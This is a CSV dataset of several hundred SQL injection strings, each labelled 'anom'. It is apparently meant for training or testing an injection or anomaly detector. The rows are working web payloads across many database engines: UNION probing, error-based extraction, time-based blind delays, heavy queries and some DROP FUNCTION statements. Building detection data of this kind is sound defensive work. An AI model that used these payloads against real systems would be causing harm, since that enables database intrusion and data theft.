payload,label
"-5245""))) union all select 8106,8106,8106#",anom
"-5606)) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"1') as jwch where 4609=4609;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",anom
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# zcyc",anom
"-1917"") or 8571=8571--",anom
"-6815 where 7609=7609 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
1) where 4992=4992;select case when 7717=7717 then 1 else null end--,anom
"1'||(select 'gmkp' where 6016=6016;select count(*) from generate_series(1,5000000))||'",anom
"1' where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",anom
-8513' union all select 7414--,anom
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",anom
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,anom
1) rlike (select * from (select(sleep(5)))sgvo),anom
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",anom
"-6086"" union all select 8700,8700,8700,8700--",anom
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('aovy'='aovy",anom
"1')) and elt(4460=2665,2665) and (('qmzu'='qmzu",anom
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",anom
"-6122"") union all select 6578,6578--",anom
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",anom
"-9003"")) union all select 9721,9721--",anom
"1%"")) union all select null,null,null,null,null,null#",anom
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('iifh'='iifh",anom
1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf,anom
"1""))) union all select null,null,null,null,null,null,null,null--",anom
1');select sleep(5) and ('qcsv'='qcsv,anom
"-2417) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",anom
1;begin dbms_lock.sleep(5); end--,anom
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('iwkg'='iwkg",anom
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('jvll' like 'jvll",anom
1%'))) and 2444=9282#,anom
1') as irnj where 7274=7274 and 6969=(select 6969 from pg_sleep(5))--,anom
"-8124) union all select 7251,7251,7251#",anom
-4669) or 2452=1601#,anom
"1"") or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1%')) union all select null,null,null--",anom
-1602' or 3038=3038,anom
-9841 where 4612=4612 union all select 4612--,anom
"1'||(select 'rfjl' where 2476=2476 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",anom
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1')) as lizu where 7691=7691 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-3546%"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",anom
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,anom
-9358' or 9887=2569--,anom
"1'||(select 'fdkl' where 4572=4572 union all select null,null,null,null,null,null,null,null,null#",anom
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",anom
"-5989%"" union all select 3581,3581,3581,3581,3581--",anom
1) where 9167=9167;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,anom
"1"")));select pg_sleep(5)--",anom
"1%"")) union all select null--",anom
"1' in boolean mode) union all select null,null,null,null,null,null,null#",anom
-2456'))) or (8459=8459)*4906 and ((('bbkp'='bbkp,anom
"-4155'))) union all select 1775,1775,1775,1775,1775,1775,1775--",anom
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null,null--",anom
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""oxxi""=""oxxi",anom
"1"" where 5328=5328 and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('qhgp'='qhgp",anom
1')));select case when 7717=7717 then 1 else null end--,anom
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (5220=5220",anom
"1%'))) and make_set(1543=5817,5817) and ((('%'='",anom
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",anom
"1));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",anom
-2951 or 4189=2291,anom
-2912')) order by 1--,anom
"1"")) as ycvh where 4523=4523 and sleep(5)#",anom
"-9606%""))) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",anom
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kird'='kird",anom
"1'||(select 'bpml' where 7360=7360 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",anom
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)# dyed",anom
-1876%') union all select 6463--,anom
"1%"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""%""=""",anom
1') and 6969=(select 6969 from pg_sleep(5)) and ('ayol'='ayol,anom
"1%')) union all select null,null,null,null,null,null#",anom
"-6587') union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",anom
"1')) as sojl where 8710=8710 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",anom
"-2605%'))) union all select 4738,4738#",anom
1) and (select * from (select(sleep(5)))gcrr)#,anom
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",anom
"-9179"") union all select 7144,7144,7144,7144,7144,7144,7144,7144--",anom
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",anom
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""uqor"" like ""uqor",anom
"1'));iif(5571=4947,1,1/0)",anom
"1'+(select 'aliz' where 5050=5050 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",anom
1') as gxfu where 9676=9676;select case when 5894=4052 then 1 else null end--,anom
"-5245' or elt(1032=1032,3623) and 'qfvo'='qfvo",anom
"1)) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
"1)) as qzmg where 4344=4344 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",anom
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""ewsr"" like ""ewsr",anom
-2960' or 2163=3143--,anom
"1) where 5385=5385 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
1') where 3767=3767 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,anom
"1"")) as hiuf where 3277=3277 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",anom
-1879%')) or 3038=3038,anom
1' rlike sleep(5)#,anom
"1 and elt(3172=7243,7243)",anom
"1%' or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"-1150') as hdby where 4032=4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",anom
1');waitfor delay '0:0:5' and ('yauq'='yauq,anom
"1%""));select pg_sleep(5) and ((""%""=""",anom
"1"" rlike (select (case when (2724=4757) then 1 else 0x28 end)) and ""cmsa""=""cmsa",anom
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",anom
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""vukd""=""vukd",anom
(select (case when (1421=1421) then 1 else 1421*(select 1421 from master..sysdatabases) end)),anom
"-5205')) union all select 8592,8592,8592,8592,8592,8592--",anom
"1 and elt(8853=1675,1675)-- jegm",anom
"1)) as nnpe where 9720=9720 union all select null,null,null,null,null,null,null,null,null#",anom
-8553'+(select adko where 1750=1750 union all select 1750#,anom
"1"")) and 8594=(select 8594 from pg_sleep(5))--",anom
"1'||(select 'ymwf' where 1229=1229 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",anom
"1%"")));select (case when (2140=5325) then 2140 else 2140*(select 2140 from information_schema.character_sets) end)#",anom
"1) as zdym where 1578=1578 union all select null,null,null#",anom
"1') as ibqr where 5372=5372 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",anom
"1""))) or 8156=(select count(*) from generate_series(1,5000000))--",anom
"1))) and make_set(8882=1593,1593) and (((7989=7989",anom
"-6846%"")) or (8459=8459)*4906 and ((""%""=""",anom
"1'||(select 'ypil' from dual where 4568=4568 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",anom
"-9541) as bnky where 3934=3934 union all select 3934,3934,3934#",anom
"-3361 where 1335=1335 or elt(5891=5092,5092)--",anom
"1' in boolean mode) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)#",anom
"1) where 9213=9213 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
1)) as hxtp where 5478=5478 and 8594=(select 8594 from pg_sleep(5))--,anom
1)) rlike sleep(5)#,anom
1%')) and (select * from (select(sleep(5)))gcrr)#,anom
"-2929""))) union all select 8999,8999#",anom
1')) as grne where 9003=9003 order by 1--,anom
"-8893%')) or elt(1032=1032,3623) and (('%'='",anom
"1'+(select jrmz where 4762=4762 and elt(9588=9794,9794))+'",anom
1');select sleep(5),anom
"1',(select (case when (7734=7734) then (select benchmark(5000000,md5(0x72747341))) else 7734*(select 7734 from mysql.db) end))",anom
"1)) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((4348=4348",anom
"-4711' in boolean mode) union all select 8007,8007,8007,8007,8007,8007--",anom
"1"") order by 1--",anom
1') as nftr where 8825=8825 or (select * from (select(sleep(5)))sddo)#,anom
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('isyg'='isyg",anom
1'+(select 'wpnm' where 8223=8223 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',anom
1')) rlike sleep(5) and (('qitl' like 'qitl,anom
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""ejpw""=""ejpw",anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'qvyq' like 'qvyq",anom
"1'+(select eztr where 4260=4260 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",anom
1';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,anom
"1%""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",anom
1%')));select case when 7717=7717 then 1 else null end--,anom
1';select case when 6555=7349 then 1 else null end--,anom
"-3420 where 9681=9681 or make_set(2438=1977,1977)--",anom
-2505' or 9323=9323#,anom
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""llgb"" like ""llgb",anom
1));begin dbms_lock.sleep(5); end--,anom
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('nvsy' like 'nvsy",anom
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",anom
"1""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""vfoh""=""vfoh",anom
"1)) as rual where 4649=4649 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",anom
"-7725%')) union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",anom
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('qpuy'='qpuy",anom
1%' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'=',anom
"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",anom
1'+(select 'jmdl' where 7827=7827;select pg_sleep(5))+',anom
"-3860' union all select 3510,3510,3510#",anom
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- rucf",anom
"-6292) union all select 7499,7499,7499,7499,7499,7499,7499--",anom
"-9859""))) union all select 6595,6595,6595,6595,6595,6595,6595#",anom
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",anom
1')) or (select * from (select(sleep(5)))sddo)#,anom
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""%""=""",anom
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'moyb'='moyb",anom
"1"") where 7578=7578 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
1')) or (select * from (select(sleep(5)))ydpu) and (('ckmm' like 'ckmm,anom
1'||(select 'tcfy' where 4546=4546 and 6969=(select 6969 from pg_sleep(5)))||',anom
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",anom
"-7395%"" order by 1--",anom
"1"")) as iqgd where 7611=7611 union all select null,null,null,null,null#",anom
1') as pxcd where 9754=9754 or sleep(5)--,anom
"1) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (3294=3294",anom
"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""zyeo"" like ""zyeo",anom
"1'+(select ounb where 4653=4653 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",anom
"-6254"" where 8941=8941 or elt(1032=1032,3623)--",anom
"1%' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and '%'='",anom
"-1483' or make_set(9354=9354,7185) and 'qfil'='qfil",anom
"1'+(select cjcp where 2590=2590 union all select null,null,null,null,null,null,null#",anom
1 where 5691=5691 and (select * from (select(sleep(5)))fzno)--,anom
"1') where 1027=1027 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",anom
1;waitfor delay '0:0:5'-- thuo,anom
"1"") as mohv where 2171=2171 or (select * from (select(sleep(5)))sddo)#",anom
1') where 5287=5287 and 7533=7533--,anom
1');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,anom
1%' and 6969=(select 6969 from pg_sleep(5)) and '%'=',anom
"1%"" and (select * from (select(sleep(5)))gcrr)#",anom
"1' or 8421=(select count(*) from generate_series(1,5000000))",anom
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",anom
"1%"") and (6016=4763)*4763 and (""%""=""",anom
"1"";select pg_sleep(5) and ""zhsc""=""zhsc",anom
"-7469) where 5875=5875 or make_set(9354=9354,7185)--",anom
"-6667%"")) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",anom
"1%') union all select null,null,null,null,null,null,null--",anom
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('rpof' like 'rpof",anom
"1"") where 2922=2922 or elt(6272=6272,sleep(5))--",anom
1' rlike (select (case when (1916=7874) then 1 else 0x28 end)) and 'ughq'='ughq,anom
"1"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""svse""=""svse",anom
"-9588')) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",anom
"-1766""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""ydzq"" like ""ydzq",anom
"1;iif(2869=9448,1,1/0)",anom
"1) where 5073=5073 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-1550' in boolean mode) union all select 9777,9777,9777--",anom
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)-- mwsm",anom
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('pqxe' like 'pqxe",anom
"1) as ezje where 5234=5234 and make_set(8403=8403,8899)--",anom
"-5139)) union all select 3373,3373,3373,3373,3373,3373,3373,3373#",anom
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)-- ofqd",anom
"1' where 4460=4460;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",anom
1) and 8594=(select 8594 from pg_sleep(5))--,anom
-3339' or 8571=8571--,anom
1');if(8858=5680) select 8858 else drop function pyuo--,anom
"1"") where 4382=4382 and 6607=2394--",anom
"1' where 2690=2690;select count(*) from generate_series(1,5000000)--",anom
"1%'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",anom
"1%'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",anom
"1"") where 4964=4964;(select * from (select(sleep(5)))srmq)--",anom
1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||',anom
"1"" where 9756=9756;if(7899=7899) select 7899 else drop function zbbp--",anom
"1' where 9420=9420 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
1' where 1557=1557;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,anom
"1 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1"")) as wssb where 5772=5772;select (case when (7852=7476) then 7852 else 7852*(select 7852 from mysql.db) end)#",anom
"1%"" waitfor delay '0:0:5' and ""%""=""",anom
"-5193 where 2175=2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",anom
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",anom
"-6254%'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (3814=3814",anom
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",anom
"-6431' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'ixix' like 'ixix",anom
"1"") and elt(4249=4249,7259) and (""upkx""=""upkx",anom
"1"")) and 2006=2006",anom
"1'||(select 'czos' from dual where 6814=6814;select * from generate_series(6414,6414,case when (6414=6455) then 1 else 0 end) limit 1--",anom
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""nwzu"" like ""nwzu",anom
"1%"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1);iif(5257=5257,1,1/0)",anom
-8095') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),anom
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""xmvr""=""xmvr",anom
1 and 6969=(select 6969 from pg_sleep(5)),anom
"1%"")));select sleep(5)#",anom
1'||(select 'ywfo' from dual where 4168=4168 rlike sleep(5)#,anom
"1"") where 1607=1607;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",anom
"1%""));waitfor delay '0:0:5'--",anom
"-7528' or make_set(3809=1821,1821) and 'kgch'='kgch",anom
"1 and 3824=benchmark(5000000,md5(0x76555642))",anom
"1"")) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""bcxh"" like ""bcxh",anom
"-2384%')) union all select 2467,2467,2467,2467#",anom
"1%"")) and 8594=(select 8594 from pg_sleep(5))--",anom
"1"")) as chal where 6661=6661;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-9772' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'igaa'='igaa",anom
-3960' or 9323=9323#,anom
"1"" where 5250=5250;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1%')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('%'='",anom
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('knbx' like 'knbx",anom
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('fowu' like 'fowu",anom
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""%""=""",anom
"1%"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ynwr"" like ""ynwr",anom
-1188)) union all select 4711--,anom
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'zetf'='zetf",anom
"1"" where 7245=7245 and 9198=9198--",anom
"-8319"")) or 7878=5970 and ((""jcaz"" like ""jcaz",anom
"1%"" and elt(1210=1210,sleep(5)) and ""%""=""",anom
"-1920'))) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",anom
"1) as tjwa where 1173=1173 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",anom
1);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,anom
"1) as fhvr where 5544=5544;iif(5257=5257,1,1/0)",anom
"1""))) and 8594=(select 8594 from pg_sleep(5))--",anom
"-5957))) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",anom
"1);iif(5462=8866,1,1/0)",anom
"1""))) and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"1)) union all select null,null--",anom
1%';begin dbms_lock.sleep(5); end and '%'=',anom
1'+(select sijr where 7250=7250;if(1665=3845) select 1665 else drop function nzod--,anom
"1"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""eeye""=""eeye",anom
1' in boolean mode) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)#,anom
"1'||(select 'epjr' from dual where 3074=3074 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'qcsi'='qcsi",anom
"-7812') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ttvo'='ttvo",anom
1'||(select 'vuku' where 3143=3143 waitfor delay '0:0:5'--,anom
"1' or 8514=benchmark(5000000,md5(0x544d5a4c))#",anom
"-5396'||(select 'fjhd' from dual where 4019=4019 union all select 4019,4019,4019,4019#",anom
"-4905"" union all select 6082,6082--",anom
"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",anom
